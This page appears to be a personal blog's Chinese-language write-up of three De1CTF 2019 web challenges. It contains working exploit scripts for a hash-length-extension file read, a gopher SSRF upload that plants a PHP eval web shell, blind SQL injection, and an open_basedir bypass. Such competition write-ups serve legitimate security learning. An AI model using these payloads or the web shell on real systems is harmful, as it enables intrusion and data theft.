@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="周末看了两天这个比赛，被学长带飞，记录一下 SSRF ME题目直接给了源码，审一波发现关键在于下边这个函数 12def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()  很明显的hash长度扩展攻击，把scan改成read就可以读文件了 有一个waf 123456def w">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="delctf 2019 web 部分writeup">
+<meta property="og:url" content="http://yoursite.com/2019/08/04/2019-delctf/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="周末看了两天这个比赛，被学长带飞，记录一下 SSRF ME题目直接给了源码，审一波发现关键在于下边这个函数 12def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()  很明显的hash长度扩展攻击，把scan改成read就可以读文件了 有一个waf 123456def w">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/08/04/2019-delctf/vRPb1hysZGo7g4uv.png!thumbnail">
+<meta property="og:image" content="http://yoursite.com/2019/08/04/2019-delctf/1564926588623.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/04/2019-delctf/1565079014540.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/04/2019-delctf/1565079219704.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/04/2019-delctf/1565084179867.png">
+<meta property="og:updated_time" content="2019-08-07T14:05:52.839Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="delctf 2019 web 部分writeup">
+<meta name="twitter:description" content="周末看了两天这个比赛，被学长带飞，记录一下 SSRF ME题目直接给了源码，审一波发现关键在于下边这个函数 12def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()  很明显的hash长度扩展攻击，把scan改成read就可以读文件了 有一个waf 123456def w">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/04/2019-delctf/vRPb1hysZGo7g4uv.png!thumbnail">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/04/2019-delctf/">
+
+
+
+
+
+  <title>delctf 2019 web 部分writeup | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/04/2019-delctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">delctf 2019 web 部分writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-04T21:21:51+08:00">
+                2019-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.3k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>周末看了两天这个比赛，被学长带飞，记录一下</p>
+<h2 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h2><p>题目直接给了源码，审一波发现关键在于下边这个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>很明显的hash长度扩展攻击，把scan改成read就可以读文件了</p>
+<p>有一个waf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>禁用了gopher和file协议，但是根据之前p牛提过的一个技巧，可以用local_file协议来读取文件（CVE-2019-9948），最终exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">param = <span class="string">'local_file:flag.txt'</span></span><br><span class="line">hash_value = requests.get(<span class="string">"http://139.180.128.86/geneSign"</span>,params=&#123;<span class="string">'param'</span>:param&#125;).text</span><br><span class="line">new_hash_value,payload = hashpumpy.hashpump(hash_value,param+<span class="string">"scan"</span>,<span class="string">"read"</span>,<span class="number">16</span>)</span><br><span class="line">payload = quote(payload[len(param):])</span><br><span class="line">a = requests.get(<span class="string">"http://139.180.128.86/De1ta"</span>,params=&#123;<span class="string">'param'</span>:param&#125;,cookies=&#123;<span class="string">'sign'</span>:new_hash_value,<span class="string">'action'</span>:payload&#125;)</span><br><span class="line"><span class="keyword">print</span> a.text</span><br></pre></td></tr></table></figure>
+
+<p>flag如下<br><img src="vRPb1hysZGo7g4uv.png!thumbnail" alt="img"></p>
+<p>ps：据说这题非预期，直接读flag.txt就可以</p>
+<h2 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h2><p>这题卡了很久，题目环境也崩了好几次，总之这题做的真的很难受</p>
+<p>登录界面很熟悉，和去年的N1CTF很像，扫一下目录</p>
+<p><img src="1564926588623.png" alt="1564926588623"></p>
+<p>很显然的源码泄露，下下来恢复一下，发现和N1CTF的代码基本一样</p>
+<p>找一下writeup，<a href="https://xz.aliyun.com/t/2148直接用题里的exp打一下就可以（一开始没意识到，还审了一晚上" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148直接用题里的exp打一下就可以（一开始没意识到，还审了一晚上</a></p>
+<p>但是这个洞还是很值得学习的</p>
+<p>进去之后根据题目的提示，需要打内网的机器，找到另一台web服务器，一看代码，去年上海大学生ctf的web题，只需要找个办法传进去数据包就可以，用gopher传，getshell之后就是找flag了，最后在/etc/下面</p>
+<p>发gopher包写shell的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">command=<span class="string">"system('ls /usr');"</span></span><br><span class="line">exp=<span class="string">'''\</span></span><br><span class="line"><span class="string">POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.18.0.2</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Length: %s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="gml.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@&lt;?php  echo 1;@eval($_POST['gml']);?&gt;</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file[1]"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file[0]"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">php/.</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="hello"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">./325.php</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="gml"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------444980421912--</span></span><br><span class="line"><span class="string">'''</span>%(<span class="number">614</span><span class="number">-15</span>+len(command),command)</span><br><span class="line">tmp = urllib.quote(exp)</span><br><span class="line">new = tmp.replace(<span class="string">"%0A"</span>,<span class="string">"%0D%0A"</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="string">"_"</span>+urllib.quote(new)</span><br><span class="line"><span class="comment">#print result</span></span><br><span class="line"><span class="comment">#url="http://oj.momomoxiaoxi.com:9090/index.php?url=gopher://127.0.0.1:80/"</span></span><br><span class="line">result=<span class="string">"gopher://172.18.0.2:80/"</span>+result</span><br><span class="line">print(requests.get(<span class="string">"http://139.180.220.125:11027/upload/s.php?url="</span>+result).text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="giftbox"><a href="#giftbox" class="headerlink" title="giftbox"></a>giftbox</h2><p>这题当时没看，只觉得前端界面很炫酷，赛后看了出题师傅的wp：<a href="https://github.com/impakho/ciscn2019_giftbox" target="_blank" rel="noopener">https://github.com/impakho/ciscn2019_giftbox</a> 由于题目环境不知道崩没崩，直接在本地搭docker了，搭的是国赛环境，但应该没什么太大区别，在这里复现一下</p>
+<p>进去可以f12看到真实的url，<code>/shell.php?a=list&amp;totp=55530902</code>，再结合源码，可以知道totp应该是用来校验的一种手段，暂时先不看，看看有什么功能</p>
+<p><img src="1565079014540.png" alt="1565079014540"></p>
+<p>有个登录，可以试一下sql注入，根据格式用<code></code>区分username和password，尝试用绕过空格的方法注入fuzz一下，发现有sql注入</p>
+<p><img src="1565079219704.png" alt="1565079219704"></p>
+<p>可以根据这个写出布尔盲注的脚本（这个脚本需要先猜一下表名，是我菜了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://x.x.x.x/shell.php?a=%s&amp;totp=%s"</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(<span class="string">"round:"</span>+str(i))</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high):</span><br><span class="line">        mid = (low+high)/<span class="number">2</span></span><br><span class="line">        database = <span class="string">"select/**/database()"</span> <span class="comment">#giftbox</span></span><br><span class="line">        table = <span class="string">"select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()"</span> <span class="comment">#users</span></span><br><span class="line">        column = <span class="string">"select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='users'"</span> <span class="comment">#password</span></span><br><span class="line">        flag = <span class="string">"select/**/group_concat(password)/**/from/**/giftbox.users/**/where/**/username='admin'"</span></span><br><span class="line">        username = <span class="string">"aa'/**/union/**/select/**/'a'/**/from/**/users/**/where/**/(ascii(substr(("</span>+flag+<span class="string">"),"</span>+str(i)+<span class="string">",1)))&gt;"</span>+str(mid)+<span class="string">"#"</span></span><br><span class="line">        password = <span class="string">'a'</span></span><br><span class="line">        payload = <span class="string">'login %s %s'</span> % (username,password)</span><br><span class="line">        payload = urllib.parse.quote(payload)</span><br><span class="line">        payload = url % (payload, totp.now())</span><br><span class="line">        result = requests.get(payload, timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"only"</span> <span class="keyword">in</span> result.text):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid<span class="number">-1</span></span><br><span class="line">        </span><br><span class="line">    temp = temp + chr(int(round((low+high+<span class="number">1</span>)/<span class="number">2</span>)))</span><br><span class="line">    print(temp.ljust(<span class="number">50</span>, <span class="string">'*'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>得到密码<code>flag{hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code>，而且带一个隐藏的命令</p>
+<p><img src="1565084179867.png" alt="1565084179867"></p>
+<p>根据提示，可以知道再launching的时候会执行eval，命令执行</p>
+<p>经过fuzz之后，发现限制了参数的长度，而且code只能为数字和字母，position只能为<code>a-zA-Z0-9})$({_+-,.</code></p>
+<p>这里可以使用php的可变变量来执行任意操作，由于有<code>open_basedir</code>的限制，无法读取/flag，需要想办法绕过</p>
+<p>这里可以使用一个方法 <a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a> 原理应该是php路径展开函数的问题</p>
+<p>根据payload写个脚本来获取flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://139.159.140.198:2345/shell.php?a=%s&amp;totp=%s"</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">real_passwd = <span class="string">'flag&#123;hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#login</span></span><br><span class="line">username = <span class="string">'admin'</span></span><br><span class="line">password = real_passwd</span><br><span class="line">payload = <span class="string">'login %s %s'</span> % (username,password)</span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line">payload = url % (payload, totp.now())</span><br><span class="line">r = s.get(payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#destruct</span></span><br><span class="line">payload = <span class="string">'destruct'</span></span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line">payload = url % (payload,totp.now())</span><br><span class="line">r = s.get(payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code,position)</span>:</span></span><br><span class="line">    payload = <span class="string">'targeting %s %s'</span> % (code,position)</span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload,totp.now())</span><br><span class="line">    r = s.get(payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'chr'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'&#123;$a(46)&#125;'</span>) <span class="comment">#.</span></span><br><span class="line">targeting(<span class="string">'c'</span>,<span class="string">'&#123;$b&#125;&#123;$b&#125;'</span>) <span class="comment">#..</span></span><br><span class="line">targeting(<span class="string">'d'</span>,<span class="string">'&#123;$a(47)&#125;'</span>) <span class="comment">#/</span></span><br><span class="line">targeting(<span class="string">'e'</span>,<span class="string">'css'</span>)</span><br><span class="line">targeting(<span class="string">'f'</span>,<span class="string">'open_basedir'</span>)</span><br><span class="line">targeting(<span class="string">'g'</span>,<span class="string">'chdir'</span>)</span><br><span class="line">targeting(<span class="string">'h'</span>,<span class="string">'ini_set'</span>)</span><br><span class="line">targeting(<span class="string">'i'</span>,<span class="string">'file_get_'</span>)</span><br><span class="line">targeting(<span class="string">'j'</span>,<span class="string">'&#123;$i&#125;contents'</span>) <span class="comment">#file_get_contents</span></span><br><span class="line">targeting(<span class="string">'k'</span>,<span class="string">'&#123;$g($e)&#125;'</span>) <span class="comment">#chdir(css)</span></span><br><span class="line">targeting(<span class="string">'l'</span>,<span class="string">'&#123;$h($f,$c)&#125;'</span>) <span class="comment">#ini_set(open_basedir,..)</span></span><br><span class="line">targeting(<span class="string">'m'</span>,<span class="string">'&#123;$g($c)&#125;'</span>) <span class="comment">#chdir(..)</span></span><br><span class="line">targeting(<span class="string">'n'</span>,<span class="string">'&#123;$h($f,$d)&#125;'</span>) <span class="comment">#ini_set(open_basedir,/)</span></span><br><span class="line">targeting(<span class="string">'o'</span>,<span class="string">'&#123;$d&#125;flag'</span>) <span class="comment">#/flag</span></span><br><span class="line">targeting(<span class="string">'p'</span>,<span class="string">'&#123;$j($o)&#125;'</span>) <span class="comment">#file_get_content(/flag)</span></span><br><span class="line">targeting(<span class="string">'q'</span>,<span class="string">'printf'</span>) </span><br><span class="line">targeting(<span class="string">'r'</span>,<span class="string">'&#123;$q($p)&#125;'</span>) <span class="comment">#printf(file_get_content(/flag))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#launch</span></span><br><span class="line">payload = <span class="string">'launch'</span></span><br><span class="line">print(payload)</span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line">payload = url % (payload,totp.now())</span><br><span class="line">r = s.get(payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/30/cryptopals-1/" rel="next" title="从零开始的密码学学习之旅（一）">
+                <i class="fa fa-chevron-left"></i> 从零开始的密码学学习之旅（一）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/07/2019-ciscn-final-easyweb/" rel="prev" title="BUUOJ ciscn final easyweb">
+                BUUOJ ciscn final easyweb <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-ME"><span class="nav-number">1.</span> <span class="nav-text">SSRF ME</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellshellshell"><span class="nav-number">2.</span> <span class="nav-text">shellshellshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#giftbox"><span class="nav-number">3.</span> <span class="nav-text">giftbox</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
